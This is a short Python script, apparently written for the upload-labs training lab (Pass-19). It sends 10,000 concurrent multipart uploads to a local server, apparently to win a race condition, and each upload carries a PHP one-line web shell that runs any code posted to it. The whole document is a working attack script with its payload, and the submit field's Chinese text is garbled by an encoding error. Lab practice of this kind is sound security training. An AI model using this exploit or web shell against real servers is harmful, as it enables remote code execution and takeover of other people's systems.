#!/usr/bin/env python
# coding:utf-8
import hackhttp
from multiprocessing.dummy import Pool as ThreadPool
def upload(lists):
    hh = hackhttp.hackhttp()
    raw = """POST /upload-labs/Pass-19/index.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------86293687427413988953373644740
Content-Length: 462
Origin: http://localhost
Connection: close
Referer: http://localhost/upload-labs/Pass-19/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------86293687427413988953373644740
Content-Disposition: form-data; name="upload_file"; filename="shell.php.7z"
Content-Type: application/octet-stream

<?php
    header("Content-type:text/html;charset=gb1232");
    echo "<pre>";
    @eval($_POST['wuya']); 
?>
-----------------------------86293687427413988953373644740
Content-Disposition: form-data; name="submit"

涓婁紶
-----------------------------86293687427413988953373644740--
"""
    code, head, html, redirect, log = hh.http('http://127.0.0.1/upload-labs/Pass-19/index.php', raw=raw)
    print(str(code) + "\r")
pool = ThreadPool(10)
pool.map(upload, range(10000))
pool.close()
pool.join()